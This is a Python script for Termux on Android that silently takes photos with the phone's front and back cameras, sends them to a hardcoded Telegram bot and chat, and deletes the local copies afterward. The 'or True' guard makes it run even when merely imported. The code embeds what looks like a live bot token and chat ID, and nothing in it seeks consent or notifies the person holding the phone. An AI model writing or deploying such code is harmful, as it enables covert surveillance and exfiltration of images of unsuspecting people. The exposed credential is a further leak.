import os
import subprocess
import requests

# --- Telegram Credentials ---
BOT_TOKEN = "8815279159:AAGgE3t6u8fuXT-nGJCN-Gowpcl65VsLA00"
CHAT_ID = "7883547875"

# Safe internal path to completely avoid permission errors
BASE_DIR = "/data/data/com.termux/files/home"

def send_to_telegram(file_path=None, message=None):
    try:
        if message:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={"chat_id": CHAT_ID, "text": message}, timeout=10)

        if file_path and os.path.exists(file_path):
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            with open(file_path, "rb") as f:
                files = {"photo": f}
                resp = requests.post(url, data={"chat_id": CHAT_ID}, files=files, timeout=30)
                
                if resp.status_code == 200:
                    os.remove(file_path)
                    print(f"Local file deleted successfully: {file_path}")
    except Exception as e:
        print(f"Telegram Error: {e}")

# Front & Rear Camera Pictures Capture Only
def capture_cameras_photos():
    back_pic = os.path.join(BASE_DIR, "back_photo.jpg")
    front_pic = os.path.join(BASE_DIR, "front_photo.jpg")

    # 1. Back Camera Picture
    try:
        if os.path.exists(back_pic):
            os.remove(back_pic)
        subprocess.run(["termux-camera-photo", "-c", "0", back_pic], timeout=15)
        if os.path.exists(back_pic):
            send_to_telegram(file_path=back_pic, message="📸 Back Camera Picture")
    except Exception as e:
        print(f"Back photo error: {e}")

    # 2. Front Camera Picture
    try:
        if os.path.exists(front_pic):
            os.remove(front_pic)
        subprocess.run(["termux-camera-photo", "-c", "1", front_pic], timeout=15)
        if os.path.exists(front_pic):
            send_to_telegram(file_path=front_pic, message="📸 Front Camera Picture")
    except Exception as e:
        print(f"Front photo error: {e}")

def main():
    send_to_telegram(message="🚀 Camera Capture Started...")
    capture_cameras_photos()
    send_to_telegram(message="✅ Both Pictures Sent Successfully!")

if __name__ == "__main__" or True:
    try:
        main()
    except Exception as e:
        print(f"API Execution Error: {e}")
